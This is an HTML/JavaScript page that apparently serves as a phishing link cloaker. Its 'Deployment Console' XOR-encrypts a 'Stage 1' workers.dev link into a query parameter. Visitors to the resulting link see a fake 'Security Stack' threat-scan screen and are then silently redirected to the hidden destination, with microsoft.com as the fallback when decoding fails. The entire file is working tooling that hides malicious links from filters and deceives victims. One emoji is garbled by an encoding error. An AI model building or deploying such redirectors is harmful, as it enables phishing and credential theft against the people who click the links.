<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Gateway Workstation</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); width: 100%; max-width: 450px; text-align: center; border: 1px solid #334155; }
        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 6px; border: 1px solid #475569; background: #0f172a; color: #38bdf8; box-sizing: border-box; }
        button { background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; }
        button:hover { background: #2563eb; }
        #result { margin-top: 20px; padding: 15px; background: #020617; border-radius: 6px; border: 1px dashed #38bdf8; font-family: monospace; font-size: 12px; word-break: break-all; color: #10b981; display: none; }
        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #3b82f6; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="bouncerUI" style="display:none;" class="card">
        <div style="font-size: 18px; margin-bottom: 10px;">üõ°Ô∏è Security Stack</div>
        <p style="color: #94a3b8; font-size: 14px;">Scanning link for potential threats...</p>
        <div class="spinner"></div>
    </div>

    <div id="generatorUI" class="card">
        <h2 style="margin-top:0; color:#38bdf8;">Deployment Console</h2>
        <p style="font-size: 13px; color: #94a3b8;">Paste your Stage 1 Link (Worker) below:</p>
        <input type="text" id="targetLink" placeholder="https://...workers.dev/#key">
        <button onclick="processLink()">ENCRYPT & MERGE</button>
        <div id="result"></div>
    </div>

    <script>
        const secretKey = "S3cur3_G4t3w4y";

        // 1. Encryption Logic
        function encrypt(text) {
            let result = "";
            for (let i = 0; i < text.length; i++) {
                result += String.fromCharCode(text.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
            }
            return btoa(result).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        }

        // 2. Decryption Logic
        function decrypt(encoded) {
            const binary = atob(encoded.replace(/-/g, '+').replace(/_/g, '/'));
            let result = "";
            for (let i = 0; i < binary.length; i++) {
                result += String.fromCharCode(binary.charCodeAt(i) ^ secretKey.charCodeAt(i % secretKey.length));
            }
            return result;
        }

        // 3. Main Controller
        window.onload = function() {
            const params = new URLSearchParams(window.location.search);
            const payload = params.get('p');

            if (payload) {
                // If link is clicked
                document.getElementById('generatorUI').style.display = 'none';
                document.getElementById('bouncerUI').style.display = 'block';
                
                setTimeout(() => {
                    try {
                        window.location.replace(decrypt(payload));
                    } catch(e) {
                        window.location.replace("https://www.microsoft.com");
                    }
                }, 2800);
            }
        };

        // 4. Button Logic
        function processLink() {
            const input = document.getElementById('targetLink').value;
            if(!input) { alert("Please paste a link first!"); return; }
            
            const encrypted = encrypt(input);
            const finalUrl = window.location.origin + window.location.pathname + "?p=" + encrypted;
            
            const resultDiv = document.getElementById('result');
            resultDiv.innerText = finalUrl;
            resultDiv.style.display = 'block';
        }
    </script>
</body>
</html>
